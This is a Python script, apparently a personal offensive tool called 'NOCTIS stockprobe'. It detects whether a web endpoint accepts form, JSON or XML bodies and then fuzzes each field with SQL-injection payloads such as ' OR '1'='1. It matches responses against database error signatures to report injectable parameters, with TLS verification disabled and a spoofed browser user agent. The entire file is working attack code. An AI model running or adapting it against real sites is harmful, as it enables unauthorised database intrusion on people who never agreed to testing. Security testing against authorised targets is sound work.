#!/usr/bin/env python3
"""
NOCTIS — focused probe: detects accepted request encoding on an endpoint
(form / json / xml) then injects each field in that encoding.
Usage:
  python stockprobe.py <endpoint_url> field1=val1 field2=val2 ...
  python stockprobe.py https://site/x/stock productId=1 storeId=1
"""
import json
import re
import ssl
import sys
import uuid
from http.cookiejar import CookieJar
from urllib.parse import urlparse, urlencode
from urllib.request import (Request, build_opener, HTTPSHandler,
                            HTTPCookieProcessor)
from urllib.error import HTTPError

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
OPENER = build_opener(HTTPSHandler(context=CTX), HTTPCookieProcessor(CookieJar()))

C = {"r": "\033[0m", "b": "\033[1m", "dim": "\033[2m", "red": "\033[31m",
     "grn": "\033[32m", "yel": "\033[33m", "cyn": "\033[36m", "mag": "\033[35m"}

SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
    r"PostgreSQL.*ERROR", r"ORA-\d{5}", r"Microsoft OLE DB Provider",
    r"Unclosed quotation mark", r"SQLite.Exception", r"System.Data.SQLite",
    r"you have an error in your sql syntax", r"quoted string not properly terminated",
    r"java\.sql\.SQLException", r"unterminated quoted string",
    r"Invalid query", r"error in your SQL",
]

def out(k, v):
    print(f"  {C['cyn']}{k:<16}{C['r']} {v}")

def snip(b):
    return b.decode("utf-8", "ignore").replace("\n", " ").strip()[:200]

def fetch(url, data=None, ctype=None, referer=None, timeout=15):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if ctype:
        h["Content-Type"] = ctype
    if referer:
        h["Referer"] = referer
        p = urlparse(referer)
        h["Origin"] = f"{p.scheme}://{p.netloc}"
    try:
        req = Request(url, data=data, headers=h,
                      method="POST" if data is not None else "GET")
        with OPENER.open(req, timeout=timeout) as r:
            return r.status, r.read(65536)
    except HTTPError as e:
        try:
            return e.code, e.read(8192)
        except Exception:
            return e.code, b""
    except Exception as e:
        return None, str(e).encode()

def enc_form(f):
    return urlencode(f).encode(), "application/x-www-form-urlencoded"

def enc_json(f):
    return json.dumps(f).encode(), "application/json"

def enc_xml(f, root):
    inner = "".join(f"<{k}>{v}</{k}>" for k, v in f.items())
    return f"<{root}>{inner}</{root}>".encode(), "application/xml"

def main():
    if len(sys.argv) < 3:
        print("usage: stockprobe.py <endpoint> field=value [field=value ...]")
        return 1
    url = sys.argv[1]
    fields = {}
    for a in sys.argv[2:]:
        if "=" not in a:
            print(f"bad arg: {a}")
            return 1
        k, v = a.split("=", 1)
        fields[k] = v

    print(f"{C['b']}{C['red']}NOCTIS{C['r']} {C['dim']}// stockprobe // {url}{C['r']}")
    out("fields", ", ".join(f"{k}={v}" for k, v in fields.items()))

    last = url.rstrip("/").split("/")[-1] or "request"
    roots = [last, "stockCheck", "request", "data", "root", "xml"]
    trials = [("form", *enc_form(fields)), ("json", *enc_json(fields))]
    for r in roots[:4]:
        trials.append((f"xml<{r}>", *enc_xml(fields, r)))

    print(f"\n{C['mag']}{C['b']}┌─ ENCODING DETECTION{C['r']}")
    mode = ctype = None
    base_status = base_body = None
    for name, body, ct in trials:
        st, b = fetch(url, data=body, ctype=ct)
        if st is None:
            out(name, f"{C['red']}no response{C['r']}")
            continue
        tag = f"{C['grn']}{st}{C['r']}" if st < 400 else f"{C['red']}{st}{C['r']}"
        out(name, f"{tag} / {len(b)}b {C['dim']}{snip(b)[:80]}{C['r']}")
        if st < 400 and mode is None:
            mode, ctype, base_status, base_body = name, ct, st, b

    if not mode:
        print(f"\n{C['red']}no accepted encoding — endpoint rejects all{C['r']}")
        return 1

    print(f"\n{C['grn']}accepted: {mode}{C['r']}  (baseline {base_status} / {len(base_body)}b)")

    def encode(f):
        if mode == "form":
            return enc_form(f)
        if mode == "json":
            return enc_json(f)
        return enc_xml(f, mode.split("<")[1].rstrip(">"))

    print(f"\n{C['mag']}{C['b']}┌─ INJECTION{C['r']}")
    for field in fields:
        for payload in ("'", "\"", "' OR '1'='1", "1)", "</x>", "\u02bc"):
            data = dict(fields)
            data[field] = payload
            body, ct = encode(data)
            st, b = fetch(url, data=body, ctype=ct)
            if st is None:
                continue
            txt = b.decode("utf-8", "ignore")
            hit = next((p for p in SQL_ERRORS if re.search(p, txt, re.I)), None)
            if hit:
                print(f"  {C['red']}{C['b']}SQLi{C['r']} {field}={payload!r} -> {st} "
                      f"{C['dim']}[{hit}]{C['r']}")
                print(f"    {C['dim']}{snip(b)}{C['r']}")
                break
            if st != base_status:
                print(f"  {C['yel']}delta{C['r']} {field}={payload!r} -> {st} "
                      f"(baseline {base_status}) {C['dim']}{snip(b)[:100]}{C['r']}")
        else:
            print(f"  {C['dim']}{field}: no direct signal{C['r']}")

    print()
    return 0

if __name__ == "__main__":
    sys.exit(main())
